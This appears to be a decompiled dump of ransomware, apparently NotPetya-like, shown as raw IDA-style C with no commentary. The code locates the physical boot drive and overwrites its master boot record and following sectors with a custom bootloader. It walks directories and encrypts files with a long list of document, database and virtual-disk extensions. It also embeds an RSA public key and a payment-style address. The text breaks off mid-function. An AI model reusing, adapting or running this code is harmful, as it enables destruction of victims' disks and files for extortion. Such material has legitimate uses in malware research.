  71,
  188,
  240,
  132,
  205,
  10,
  170,
  77,
  242,
  156,
  137,
  185,
  222,
  132,
  77,
  10,
  68,
  204,
  204,
  204,
  132,
  253,
  51,
  71,
  242,
  132,
  205,
  52,
  147,
  146,
  15,
  132,
  253,
  12,
  39,
  52,
  154,
  157,
  155,
  132,
  69,
  10,
  132,
  253,
  12,
  69,
  11,
  13,
  43,
  203,
  229,
  11,
  69,
  52,
  253,
  5,
  70,
  194,
  76,
  53,
  204,
  184,
  203,
  205,
  4,
  132,
  51,
  10,
  39,
  43,
  147,
  149,
  146,
  15,
  154,
  155,
  158,
  132,
  69,
  10,
  132,
  253,
  12,
  69,
  11,
  13,
  43,
  203,
  229,
  11,
  69,
  52,
  253,
  30,
  70,
  218,
  205,
  28,
  132,
  51,
  10,
  46,
  32,
  150,
  147,
  146,
  15,
  154,
  157,
  155,
  132,
  69,
  10,
  132,
  253,
  12,
  69,
  11,
  13,
  43,
  203,
  229,
  11,
  69,
  52,
  253,
  5,
  70,
  194,
  76,
  53,
  204,
  184,
  198,
  205,
  4,
  132,
  51,
  10,
  132,
  51,
  10,
  39,
  40,
  147,
  149,
  146,
  15,
  154,
  132,
  69,
  10,
  132,
  79,
  10,
  212,
  132,
  253,
  12,
  71,
  202,
  146,
  15,
  159,
  169,
  132,
  71,
  200,
  233,
  244,
  204,
  204,
  204,
  132,
  71,
  140,
  200,
  132,
  13,
  36,
  192,
  132,
  13,
  44,
  192,
  132,
  71,
  212,
  170,
  77,
  55,
  129,
  150,
  184,
  196,
  132,
  225,
  204,
  220,
  204,
  204,
  39,
  34,
  151,
  15,
  155,
  154,
  157,
  132,
  253,
  51,
  132,
  69,
  10,
  132,
  253,
  12,
  71,
  200,
  118,
  132,
  205,
  60,
  36,
  140,
  51,
  51,
  51,
  245,
  4,
  184,
  194,
  132,
  51,
  11,
  132,
  245,
  19,
  184,
  199,
  39,
  40,
  149,
  146,
  147,
  15,
  132,
  69,
  52,
  39,
  59,
  132,
  253,
  12,
  39,
  62,
  154,
  132,
  69,
  10,
  132,
  253,
  12,
  71,
  141,
  208,
  132,
  205,
  60,
  146,
  15,
  154,
  132,
  69,
  10,
  132,
  253,
  12,
  71,
  141,
  236,
  132,
  205,
  60,
  146,
  15,
  154,
  132,
  69,
  10,
  132,
  253,
  12,
  71,
  141,
  232,
  132,
  205,
  60,
  146,
  15,
  132,
  29,
  45,
  132,
  205,
  4,
  170,
  71,
  204,
  15,
  132,
  77,
  6,
  204,
  204,
  51,
  51,
  132,
  77,
  62,
  204,
  204,
  51,
  51,
  132,
  13,
  46,
  206,
  132,
  205,
  29,
  132,
  253,
  30,
  71,
  221,
  132,
  205,
  28,
  15,
  155,
  154,
  159,
  153,
  141,
  152,
  141,
  153,
  141,
  154,
  141,
  155,
  133,
  69,
  40,
  132,
  77,
  32,
  196,
  205,
  204,
  204,
  133,
  69,
  3,
  132,
  65,
  225,
  44,
  51,
  51,
  51,
  170,
  77,
  41,
  204,
  60,
  132,
  69,
  129,
  148,
  132,
  253,
  30,
  170,
  71,
  157,
  206,
  132,
  205,
  6,
  132,
  247,
  221,
  184,
  202,
  132,
  65,
  133,
  196,
  39,
  57,
  132,
  65,
  141,
  228,
  132,
  69,
  137,
  248,
  132,
  71,
  141,
  60,
  132,
  69,
  137,
  228,
  36,
  228,
  205,
  204,
  204,
  36,
  183,
  205,
  204,
  204,
  132,
  73,
  12,
  195,
  72,
  33,
  204,
  204,
  204,
  128,
  71,
  161,
  240,
  141,
  71,
  129,
  112,
  36,
  53,
  204,
  204,
  204,
  240,
  60,
  184,
  193,
  240,
  61,
  184,
  209,
  240,
  62,
  184,
  239,
  37,
  113,
  204,
  204,
  204,
  132,
  71,
  129,
  228,
  71,
  137,
  136,
  69,
  141,
  194,
  124,
  205,
  68,
  141,
  222,
  37,
  105,
  204,
  204,
  204,
  36,
  56,
  204,
  204,
  204,
  37,
  87,
  204,
  204,
  204,
  132,
  253,
  23,
  132,
  253,
  58,
  132,
  253,
  51,
  133,
  71,
  137,
  20,
  71,
  212,
  71,
  188,
  200,
  71,
  180,
  196,
  71,
  129,
  132,
  253,
  7,
  253,
  2,
  253,
  3,
  141,
  247,
  185,
  220,
  185,
  183,
  247,
  145,
  152,
  132,
  71,
  137,
  128,
  184,
  218,
  36,
  29,
  204,
  204,
  204,
  132,
  65,
  159,
  200,
  132,
  253,
  5,
  51,
  153,
  220,
  132,
  69,
  137,
  128,
  69,
  145,
  152,
  132,
  73,
  12,
  184,
  151,
  132,
  205,
  59,
  132,
  245,
  19,
  187,
  131,
  132,
  229,
  59,
  132,
  205,
  11,
  155,
  132,
  69,
  61,
  157,
  133,
  71,
  185,
  36,
  63,
  104,
  149,
  132,
  13,
  37,
  206,
  146,
  71,
  153,
  132,
  253,
  218,
  132,
  79,
  10,
  200,
  46,
  52,
  132,
  205,
  20,
  132,
  245,
  10,
  176,
  237,
  51,
  153,
  128,
  36,
  77,
  204,
  204,
  204,
  71,
  137,
  136,
  29,
  36,
  132,
  253,
  5,
  68,
  13,
  132,
  205,
  37,
  71,
  197,
  253,
  4,
  69,
  137,
  136,
  36,
  143,
  204,
  204,
  204,
  124,
  221,
  39,
  196,
  124,
  237,
  39,
  200,
  124,
  253,
  39,
  204,
  132,
  71,
  129,
  228,
  120,
  204,
  170,
  205,
  141,
  218,
  132,
  71,
  137,
  236,
  128,
  69,
  53,
  128,
  69,
  40,
  141,
  147,
  141,
  146,
  141,
  145,
  141,
  144,
  145,
  151,
  146,
  147,
  51,
  172,
  180,
  253,
  12,
  68,
  4,
  13,
  37,
  196,
  204,
  4,
  13,
  37,
  196,
  204,
  4,
  13,
  37,
  196,
  204,
  4,
  15,
  157,
  71,
  137,
  136,
  69,
  13,
  195,
  5,
  29,
  44,
  253,
  4,
  69,
  137,
  132,
  149,
  15,
  157,
  36,
  194,
  204,
  204,
  204,
  132,
  71,
  137,
  236,
  132,
  71,
  132,
  180,
  132,
  69,
  132,
  188,
  149,
  15,
  159,
  155,
  132,
  79,
  32,
  228,
  132,
  71,
  145,
  128,
  132,
  73,
  23,
  184,
  223,
  253,
  12,
  132,
  69,
  19,
  132,
  253,
  5,
  71,
  129,
  152,
  63,
  102,
  132,
  69,
  21,
  51,
  153,
  212,
  132,
  253,
  12,
  69,
  137,
  152,
  132,
  69,
  137,
  128,
  132,
  79,
  8,
  228,
  147,
  151,
  15,
  157,
  154,
  155,
  132,
  71,
  185,
  248,
  132,
  71,
  194,
  36,
  132,
  204,
  204,
  204,
  132,
  73,
  12,
  185,
  221,
  132,
  65,
  186,
  196,
  132,
  71,
  194,
  36,
  251,
  204,
  204,
  204,
  132,
  73,
  12,
  184,
  231,
  132,
  69,
  129,
  248,
  166,
  192,
  148,
  132,
  65,
  125,
  92,
  204,
  204,
  204,
  247,
  202,
  184,
  196,
  132,
  79,
  10,
  196,
  247,
  202,
  185,
  221,
  247,
  138,
  200,
  185,
  192,
  132,
  69,
  185,
  240,
  132,
  253,
  12,
  132,
  51,
  12,
  39,
  207,
  132,
  253,
  12,
  147,
  146,
  149,
  15,
  132,
  253,
  12,
  132,
  245,
  13,
  177,
  207,
  132,
  51,
  12,
  15,
  0,
  0,
  0,
  0,
  0,
  0
}; // idb
_UNKNOWN unk_682031A8; // weak
_UNKNOWN unk_68204388; // weak
int dword_68206000 = 1; // weak
int dword_68206010 = 1; // weak
char SomeExe1[4] = "MZ\x90"; // weak
_UNKNOWN loc_68206A51; // weak
_UNKNOWN unk_68207090; // weak
_UNKNOWN SomeExe2; // weak
_UNKNOWN unk_68208AD0; // weak
char aVVVVVVVVvv[18] = ""; // weak
_UNKNOWN unk_68208B48; // weak
char aUUUdugufuUdugu[46] = "u)u)uDuGuFu[uDuGu[uFuDu[uGu)u<u%u6uQuuuJJJJJu"; // weak
char aVVVVVVVvv[16] = ""; // weak
_UNKNOWN FormatsCharArray; // weak
_UNKNOWN MBR1; // weak
_UNKNOWN unk_68208E50; // weak
int (__stdcall *off_6820B104)(_DWORD) = &CreateHeap; // weak
__int16 word_6820B110 = 0; // weak
__int16 word_6820F0F8; // weak
int dword_6820F0FC; // idb
LPWSTR lpMem; // idb
int EnumeratedProcessesHandle; // weak
LPCRITICAL_SECTION lpCriticalSection; // idb
int dword_6820F10C; // weak
LPCRITICAL_SECTION dword_6820F110; // idb
int PrivCheckCompleted; // weak
int TickCountTime; // weak
int dword_6820F11C; // idb
HMODULE Src; // idb
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_6820F13C; // weak
LPVOID lpParameter; // idb
int gPrivLevel; // weak
WCHAR pszPath; // idb
int dword_6820F760; // weak
struct WSAData stru_6820F768; // idb
int dword_6820F8F8; // weak
char byte_6820F8FC; // weak
char byte_6820F8FD; // weak
_UNKNOWN unk_6820F900; // weak
__int64 qword_6820FAD0; // weak
int dword_6820FAD8; // weak
int dword_6820FADC; // weak
__int64 qword_6820FAE0; // weak
int qword_6820FAE8; // idb
__int64 qword_6820FAF0; // weak
__int64 qword_6820FAF8; // weak
__int64 qword_6820FB00; // weak
int dword_6820FB08; // weak
int dword_6820FB0C; // weak
int dword_6820FB10; // weak
int dword_6820FB14; // weak
int dword_6820FB18; // weak
int dword_6820FB1C; // weak
__int16 word_6820FB20; // weak
int dword_6820FB24; // weak
__int16 word_6820FB28; // weak
__int16 word_6820FB2C; // weak
__int16 word_6820FB30; // weak
__int16 word_6820FB34; // weak
int dword_6820FB38; // weak
int dword_6820FB3C; // weak
int dword_6820FB40; // weak
__int16 word_6820FB44; // weak
int dword_6820FB48; // weak


//----- (681F1000) --------------------------------------------------------
LPVOID __stdcall CreateHeap(SIZE_T dwBytes)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapAlloc(v1, 8u, dwBytes);
}

//----- (681F1019) --------------------------------------------------------
void __stdcall FreeHeap(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  if ( lpMem )
  {
    ProcessHeap = GetProcessHeap();
    HeapFree(ProcessHeap, 8u, lpMem);
  }
}

//----- (681F1038) --------------------------------------------------------
int __stdcall GetSystemVolumes(void *a1)
{
  int result; // eax
  HANDLE v2; // eax
  signed __int32 v3; // eax
  unsigned int v4; // kr00_4
  size_t v5; // edi
  unsigned int v6; // ecx
  const char *v7; // esi
  unsigned int v8; // eax
  int v9; // edi
  CHAR Buffer; // [esp+10h] [ebp-26Ch]
  char Dst; // [esp+11h] [ebp-26Bh]
  char Src; // [esp+118h] [ebp-164h]
  char v13; // [esp+119h] [ebp-163h]
  int OutBuffer; // [esp+220h] [ebp-5Ch]
  int Val; // [esp+228h] [ebp-54h]
  char DstBuf; // [esp+240h] [ebp-3Ch]
  char v17; // [esp+241h] [ebp-3Bh]
  __int16 v18; // [esp+25Dh] [ebp-1Fh]
  char v19; // [esp+25Fh] [ebp-1Dh]
  DWORD BytesReturned; // [esp+260h] [ebp-1Ch]
  HANDLE hObject; // [esp+264h] [ebp-18h]
  size_t Size; // [esp+268h] [ebp-14h]
  int v23; // [esp+26Ch] [ebp-10h]
  CHAR FileName[4]; // [esp+270h] [ebp-Ch]
  __int16 v25; // [esp+274h] [ebp-8h]

  v23 = 0;
  Buffer = 0;
  memset(&Dst, 0, 0x103u);
  Src = 0;
  memset(&v13, 0, 0x103u);
  OutBuffer = 0;
  memset(&Val, 0, 0x18u);
  DstBuf = 0;
  memset(&v17, 0, 0x1Cu);
  v18 = 0;
  strcpy(FileName, "\\\\.\\0:");
  BytesReturned = 0;
  v19 = 0;
  if ( !a1 )
    return 160;
  memset(a1, 0, 0x104u);
  strcpy(&Src, "\\\\.\\PhysicalDrive");
  if ( GetSystemDirectoryA(&Buffer, 0x104u)
    && (LOBYTE(v25) = Buffer, v2 = CreateFileA(FileName, 0, 3u, 0, 3u, 0, 0), hObject = v2, v2 != -1) )
  {
    if ( DeviceIoControl(v2, 0x560000u, 0, 0, &OutBuffer, 0x20u, &BytesReturned, 0) )
    {
      itoa(Val, &DstBuf, 10);
      v4 = strlen(&Src);
      v5 = v4;
      v6 = strlen(&DstBuf);
      Size = v6;
      if ( v6 + v4 + 1 <= 0x104 )
      {
        if ( v4 <= 0 )
        {
          v7 = a1;
        }
        else
        {
          if ( v4 > 0x103 )
            v5 = 259;
          v7 = a1;
          memcpy(a1, &Src, v5);
          v6 = Size;
          *(a1 + v5) = 0;
        }
        v8 = strlen(v7);
        if ( v6 > 0 )
        {
          v9 = v6 + v8;
          if ( v6 + v8 < 0x104 )
          {
            memcpy(&v7[v8], &DstBuf, Size);
            v7[v9] = 0;
          }
        }
      }
      else
      {
        v23 = -2147024774;
      }
    }
    else
    {
      v3 = GetLastError();
      if ( v3 > 0 )
        v3 = v3 | 0x80070000;
      v23 = v3;
    }
    CloseHandle(hObject);
    result = v23;
  }
  else
  {
    result = GetLastError();
    if ( result > 0 )
      result = result | 0x80070000;
  }
  return result;
}

//----- (681F122D) --------------------------------------------------------
int __stdcall CreateSomeFiles(LPCSTR lpFileName, int a2)
{
  signed __int32 v2; // esi
  HANDLE v4; // edi
  signed __int32 v5; // eax
  signed __int32 v6; // eax
  int OutBuffer; // [esp+8h] [ebp-98h]
  DWORD BytesReturned; // [esp+9Ch] [ebp-4h]

  v2 = 0;
  BytesReturned = 0;
  if ( !lpFileName )
    return -2147024809;
  v4 = CreateFileA(lpFileName, 0x80100000, 3u, 0, 3u, 0, 0);
  if ( v4 == -1 )
  {
    v5 = GetLastError();
    if ( v5 > 0 )
      v5 = v5 | 0x80070000;
    v2 = v5;
  }
  else
  {
    if ( DeviceIoControl(v4, 0x70048u, 0, 0, &OutBuffer, 0x90u, &BytesReturned, 0) )
    {
      *a2 = OutBuffer;
    }
    else
    {
      v6 = GetLastError();
      if ( v6 > 0 )
        v6 = v6 | 0x80070000;
      v2 = v6;
    }
    CloseHandle(v4);
  }
  return v2;
}

//----- (681F12D5) --------------------------------------------------------
int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst)
{
  signed __int32 v2; // esi
  HANDLE v4; // ebx
  signed __int32 v5; // eax
  signed __int32 v6; // eax
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-4h]

  v2 = 0;
  NumberOfBytesRead = 0;
  if ( !lpFileName )
    return -2147024809;
  memset(Dst, 0, 0x200u);
  v4 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
  if ( v4 == -1 )
  {
    v5 = GetLastError();
    if ( v5 > 0 )
      v5 = v5 | 0x80070000;
    v2 = v5;
  }
  else
  {
    if ( !SetFilePointerEx(v4, 0i64, 0, 0) || !ReadFile(v4, Dst, 0x200u, &NumberOfBytesRead, 0) )
    {
      v6 = GetLastError();
      if ( v6 > 0 )
        v6 = v6 | 0x80070000;
      v2 = v6;
    }
    CloseHandle(v4);
  }
  return v2;
}

//----- (681F1384) --------------------------------------------------------
int __userpurge CheckIfFileExists@<eax>(int a1@<eax>, LPCSTR lpFileName, LPCVOID lpBuffer)
{
  signed __int32 v3; // edi
  int v4; // esi
  HANDLE v6; // ebx
  signed __int32 v7; // eax
  signed __int32 v8; // eax
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h]

  v3 = 0;
  v4 = a1;
  NumberOfBytesWritten = 0;
  if ( !lpFileName )
    return -2147024809;
  v6 = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0, 0);
  if ( v6 == -1 )
  {
    v7 = GetLastError();
    if ( v7 > 0 )
      v7 = v7 | 0x80070000;
    v3 = v7;
  }
  else
  {
    if ( !SetFilePointerEx(v6, (v4 << 9), 0, 0) || !WriteFile(v6, lpBuffer, 0x200u, &NumberOfBytesWritten, 0) )
    {
      v8 = GetLastError();
      if ( v8 > 0 )
        v8 = v8 | 0x80070000;
      v3 = v8;
    }
    CloseHandle(v6);
  }
  return v3;
}

//----- (681F1424) --------------------------------------------------------
int __stdcall CryptoAcquireContext(BYTE *pbBuffer, DWORD dwLen)
{
  signed __int32 v2; // eax
  signed __int32 v3; // eax
  HCRYPTPROV phProv; // [esp+Ch] [ebp-4h]

  phProv = 0;
  if ( CryptAcquireContextA(&phProv, 0, 0, 1u, 0xF0000000) )
    goto LABEL_14;
  v2 = GetLastError();
  if ( v2 > 0 )
    v2 = v2 | 0x80070000;
  dword_6820F8F8 = v2;
  if ( v2 >= 0 )
  {
LABEL_14:
    if ( !CryptGenRandom(phProv, dwLen, pbBuffer) )
    {
      v3 = GetLastError();
      if ( v3 > 0 )
        v3 = v3 | 0x80070000;
      dword_6820F8F8 = v3;
    }
  }
  if ( phProv )
    CryptReleaseContext(phProv, 0);
  return dword_6820F8F8;
}
// 6820F8F8: using guessed type int dword_6820F8F8;

//----- (681F14A9) --------------------------------------------------------
int RunCryptWriteMBR()
{
  int result; // eax
  unsigned int v1; // ecx
  unsigned int v2; // edx
  unsigned int *v3; // ecx
  signed int v4; // edi
  unsigned int v5; // edx
  unsigned int v6; // eax
  char *v7; // eax
  size_t v8; // esi
  void *v9; // eax
  void *v10; // eax
  int v11; // eax
  int v12; // ebx
  char *v13; // eax
  _DWORD *v14; // ecx
  signed int v15; // edx
  _DWORD *v16; // edi
  _DWORD *v17; // esi
  unsigned int v18; // esi
  unsigned int v19; // edi
  char v20; // [esp+10h] [ebp-998h]
  char v21; // [esp+11h] [ebp-997h]
  char v22; // [esp+210h] [ebp-798h]
  char v23; // [esp+211h] [ebp-797h]
  char v24; // [esp+410h] [ebp-598h]
  char v25; // [esp+411h] [ebp-597h]
  int v26; // [esp+5C8h] [ebp-3E0h]
  __int16 v27; // [esp+5CCh] [ebp-3DCh]
  char v28; // [esp+5CEh] [ebp-3DAh]
  char v29; // [esp+5D6h] [ebp-3D2h]
  char Buffer; // [esp+610h] [ebp-398h]
  BYTE v31; // [esp+611h] [ebp-397h]
  BYTE v32; // [esp+631h] [ebp-377h]
  char v33; // [esp+639h] [ebp-36Fh]
  char v34; // [esp+65Bh] [ebp-34Dh]
  char v35[343]; // [esp+6B9h] [ebp-2EFh]
  CHAR FileName; // [esp+810h] [ebp-198h]
  char Dst; // [esp+811h] [ebp-197h]
  BYTE pbBuffer; // [esp+91Ch] [ebp-8Ch]
  char v39; // [esp+91Dh] [ebp-8Bh]
  char v40; // [esp+957h] [ebp-51h]
  char Src; // [esp+958h] [ebp-50h]
  char v42; // [esp+959h] [ebp-4Fh]
  size_t v43; // [esp+998h] [ebp-10h]
  size_t Size; // [esp+99Ch] [ebp-Ch]
  const void *v45; // [esp+9A0h] [ebp-8h]
  void *v46; // [esp+9A4h] [ebp-4h]

  FileName = 0;
  memset(&Dst, 0, 0x103u);
  v24 = 0;
  memset(&v25, 0, 0x1FFu);
  Buffer = 0;
  memset(&v31, 0, 0x1FFu);
  v20 = 0;
  memset(&v21, 0, 0x1FFu);
  v22 = 0;
  memset(&v23, 0, 0x1FFu);
  pbBuffer = 0;
  memset(&v39, 0, 0x3Bu);
  Src = 0;
  memset(&v42, 0, 0x3Cu);
  Size = 0;
  result = GetSystemVolumes(&FileName);
  dword_6820F8F8 = result;
  if ( result >= 0 )
  {
    result = CreateSomeFiles(&FileName, &v46);
    dword_6820F8F8 = result;
    if ( result >= 0 )
    {
      if ( v46 )
      {
        result = -2147024846;
LABEL_48:
        dword_6820F8F8 = result;
        return result;
      }
      result = CryptoAcquireContext(&pbBuffer, 0x3Cu);
      dword_6820F8F8 = result;
      if ( result >= 0 )
      {
        v1 = 0;
        do
        {
          v2 = *(&pbBuffer + v1++) % 0x3Au;
          *(&v40 + v1) = byte_681FFF4C[v2];
        }
        while ( v1 < 0x3C );
        result = CreateFileSetFP(&FileName, &v24);
        dword_6820F8F8 = result;
        if ( result >= 0 )
        {
          v3 = &v29;
          v4 = 4;
          v5 = 0;
          do
          {
            if ( *v3 && *v3 < 0xFFFFFFFF )
              v5 = *v3;
            v3 += 4;
            --v4;
          }
          while ( v4 );
          if ( v5 == -1 )
            v5 = 0;
          if ( v5 <= 0x28 )
          {
            result = -2147024270;
            goto LABEL_48;
          }
          qmemcpy(&v22, &v24, 0x200u);
          v6 = 0;
          do
          {
            *(&v22 + v6) ^= 7u;
            ++v6;
          }
          while ( v6 < 0x200 );
          memset(&v20, 7, 0x200u);
          Buffer = 0;
          result = CryptoAcquireContext(&v31, 0x20u);
          dword_6820F8F8 = result;
          if ( result >= 0 )
          {
            result = CryptoAcquireContext(&v32, 8u);
            dword_6820F8F8 = result;
            if ( result >= 0 )
            {
              memcpy(&v33, "1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX", 0x22u);
              v34 = 0;
              v7 = &Src + strlen(&Src) + 1;
              v8 = v7 - &v42;
              if ( v7 != &v42 )
              {
                if ( v8 > 0x156 )
                  v8 = 342;
                memcpy(v35, &Src, v8);
                v35[v8] = 0;
              }
              v9 = off_6820B104(512);
              v45 = v9;
              if ( v9 )
              {
                qmemcpy(v9, &MBR1, 0x200u);
                result = 0;
              }
              else
              {
                result = -2147024882;
              }
              dword_6820F8F8 = result;
              if ( result >= 0 )
              {
                v10 = off_6820B104(8881);
                v46 = v10;
                if ( v10 )
                {
                  Size = 8881;
                  memcpy(v10, &unk_68208E50, 0x22B1u);
                  result = 0;
                }
                else
                {
                  result = -2147024882;
                }
                dword_6820F8F8 = result;
                if ( result >= 0 )
                {
                  v43 = Size - (Size & 0x1FF) + 1024;
                  v11 = off_6820B104(v43);
                  v12 = v11;
                  if ( !v11 )
                  {
                    result = -2147024882;
                    goto LABEL_48;
                  }
                  qmemcpy(v11, v45, 0x200u);
                  *(v11 + 440) = v26;
                  *(v11 + 444) = v27;
                  v13 = &v28;
                  v14 = (v12 + 446);
                  v15 = 4;
                  do
                  {
                    *v14 = *v13;
                    v14[1] = *(v13 + 1);
                    v14[2] = *(v13 + 2);
                    v17 = v13 + 12;
                    v16 = v14 + 3;
                    v13 += 16;
                    v14 += 4;
                    --v15;
                    *v16 = *v17;
                  }
                  while ( v15 );
                  memcpy((v12 + 512), v46, Size);
                  v18 = v43 >> 9;
                  result = 0;
                  if ( v43 >> 9 )
                  {
                    v19 = 0;
                    if ( v18 )
                    {
                      do
                      {
                        result = CheckIfFileExists(v19, &FileName, v12);
                        if ( result < 0 )
                          break;
                        ++v19;
                        v12 += 512;
                      }
                      while ( v19 < v18 );
                    }
                  }
                  else
                  {
                    result = -2147024809;
                  }
                  dword_6820F8F8 = result;
                  if ( result >= 0 )
                  {
                    result = CheckIfFileExists(32, &FileName, &Buffer);
                    dword_6820F8F8 = result;
                    if ( result >= 0 )
                    {
                      result = CheckIfFileExists(33, &FileName, &v20);
                      dword_6820F8F8 = result;
                      if ( result >= 0 )
                      {
                        result = CheckIfFileExists(34, &FileName, &v22);
                        goto LABEL_48;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 6820B104: using guessed type int (__stdcall *off_6820B104)(_DWORD);
// 6820F8F8: using guessed type int dword_6820F8F8;
// 681F14A9: using guessed type char var_2EF[343];

//----- (681F189A) --------------------------------------------------------
HANDLE __stdcall WriteFileMapping(LPCWSTR lpFileName, int a2)
{
  HANDLE result; // eax
  HANDLE v3; // edi
  DWORD v4; // ebx
  HANDLE v5; // eax
  void *v6; // edi
  LARGE_INTEGER FileSize; // [esp+10h] [ebp-18h]
  HANDLE v8; // [esp+1Ch] [ebp-Ch]
  HANDLE hObject; // [esp+20h] [ebp-8h]
  BOOL Final; // [esp+24h] [ebp-4h]

  result = CreateFileW(lpFileName, 0xC0000000, 0, 0, 3u, 0, 0);
  v3 = result;
  v8 = result;
  if ( result != -1 )
  {
    GetFileSizeEx(result, &FileSize);
    Final = 0;
    if ( FileSize.QuadPart <= 0x100000 )
    {
      lpFileName = FileSize.s.LowPart;
      Final = 1;
      v4 = 16 * ((FileSize.s.LowPart >> 4) + 1);
    }
    else
    {
      lpFileName = 0x100000;
      v4 = 0x100000;
    }
    v5 = CreateFileMappingW(v3, 0, 4u, 0, v4, 0);
    hObject = v5;
    if ( v5 )
    {
      v6 = MapViewOfFile(v5, 6u, 0, 0, lpFileName);
      if ( v6 )
      {
        if ( CryptEncrypt(*(a2 + 20), 0, Final, 0, v6, &lpFileName, v4) )
          FlushViewOfFile(v6, lpFileName);
        UnmapViewOfFile(v6);
      }
      CloseHandle(hObject);
    }
    result = CloseHandle(v8);
  }
  return result;
}

//----- (681F1973) --------------------------------------------------------
void __stdcall EnumerateFiles(LPCWSTR pszDir, int a2, int a3)
{
  void *v3; // eax
  DWORD v4; // eax
  struct _WIN32_FIND_DATAW *v5; // eax
  HANDLE hFindFile; // [esp+Ch] [ebp-86Ch]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-868h]
  WCHAR FileName; // [esp+260h] [ebp-618h]
  WCHAR pszDest; // [esp+468h] [ebp-410h]
  WCHAR v10; // [esp+670h] [ebp-208h]

  if ( a2 )
  {
    if ( PathCombineW(&pszDest, pszDir, L"*") )
    {
      hFindFile = FindFirstFileW(&pszDest, &FindFileData);
      if ( hFindFile != -1 )
      {
        do
        {
          v3 = *(a3 + 28);
          if ( v3 )
          {
            v4 = WaitForSingleObject(v3, 0);
            if ( !v4 || v4 == -1 )
              break;
          }
          if ( wcscmp(FindFileData.cFileName, L".")
            && wcscmp(FindFileData.cFileName, L"..")
            && PathCombineW(&FileName, pszDir, FindFileData.cFileName) )
          {
            if ( !(FindFileData.dwFileAttributes & 0x10) || FindFileData.dwFileAttributes & 0x400 )
            {
              v5 = PathFindExtensionW(FindFileData.cFileName);
              if ( v5 != &FindFileData.cFileName[wcslen(FindFileData.cFileName)] )
              {
                wsprintfW(&v10, L"%ws.", v5);
                if ( StrStrIW(
                       L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb."
                        "gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.s"
                        "ql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.",
                       &v10) )
                {
                  WriteFileMapping(&FileName, a3);
                }
              }
            }
            else if ( !StrStrIW(L"C:\\Windows;", &FileName) )
            {
              EnumerateFiles(&FileName, a2 - 1, a3);
            }
          }
        }
        while ( FindNextFileW(hFindFile, &FindFileData) );
        FindClose(hFindFile);
      }
    }
  }
}
// 681FD248: using guessed type int __stdcall StrStrIW(_DWORD, _DWORD);
// 68200824: using guessed type wchar_t aCWindows[12];
// 68200840: using guessed type wchar_t Extensions[271];
// 68200A70: using guessed type wchar_t a_[2];
// 68200A74: using guessed type wchar_t a__[3];

//----- (681F1B4E) --------------------------------------------------------
BOOL __usercall CryptoGenerateKey@<eax>(int a1@<eax>)
{
  HCRYPTKEY *v1; // esi
  HCRYPTKEY v2; // ST00_4
  HCRYPTKEY v3; // ST00_4
  BOOL v5; // [esp+8h] [ebp-Ch]
  BYTE v6[4]; // [esp+Ch] [ebp-8h]
  BYTE pbData[4]; // [esp+10h] [ebp-4h]

  v1 = (a1 + 20);
  v5 = CryptGenKey(*(a1 + 8), 0x660Eu, 1u, (a1 + 20));
  if ( v5 )
  {
    v2 = *v1;
    *pbData = 1;
    CryptSetKeyParam(v2, 4u, pbData, 0);
    v3 = *v1;
    *v6 = 1;
    CryptSetKeyParam(v3, 3u, v6, 0);
  }
  return v5;
}

//----- (681F1BA0) --------------------------------------------------------
BOOL __stdcall ImportPubKey(int a1)
{
  const WCHAR *v1; // ST08_4
  BYTE *v2; // ebx
  BYTE *v3; // eax
  BOOL v5; // [esp+8h] [ebp-14h]
  BYTE *pbData; // [esp+10h] [ebp-Ch]
  DWORD pcbStructInfo; // [esp+14h] [ebp-8h]
  DWORD pcbBinary; // [esp+18h] [ebp-4h]

  v1 = *(a1 + 16);
  v5 = 0;
  pcbBinary = 0;
  if ( CryptStringToBinaryW(v1, 0, 1u, 0, &pcbBinary, 0, 0) )
  {
    v2 = LocalAlloc(0x40u, pcbBinary);
    if ( v2 )
    {
      if ( CryptStringToBinaryW(
             L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iD"
              "qmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+C"
              "XsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJY"
              "CeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB",
             0,
             1u,
             v2,
             &pcbBinary,
             0,
             0) )
      {
        pcbStructInfo = 0;
        if ( CryptDecodeObjectEx(0x10001u, 0x13, v2, pcbBinary, 0, 0, 0, &pcbStructInfo) )
        {
          v3 = LocalAlloc(0x40u, pcbStructInfo);
          pbData = v3;
          if ( v3 )
          {
            if ( CryptDecodeObjectEx(0x10001u, 0x13, v2, pcbBinary, 0, 0, v3, &pcbStructInfo) )
              v5 = CryptImportKey(*(a1 + 8), pbData, pcbStructInfo, 0, 0, (a1 + 12));
            LocalFree(pbData);
          }
        }
      }
      LocalFree(v2);
    }
  }
  return v5;
}

//----- (681F1C7F) --------------------------------------------------------
HLOCAL __usercall CryptoExportKey@<eax>(int a1@<eax>)
{
  int v1; // esi
  HCRYPTKEY v2; // ST04_4
  HCRYPTKEY v3; // ST00_4
  BYTE *v4; // eax
  HLOCAL v5; // edi
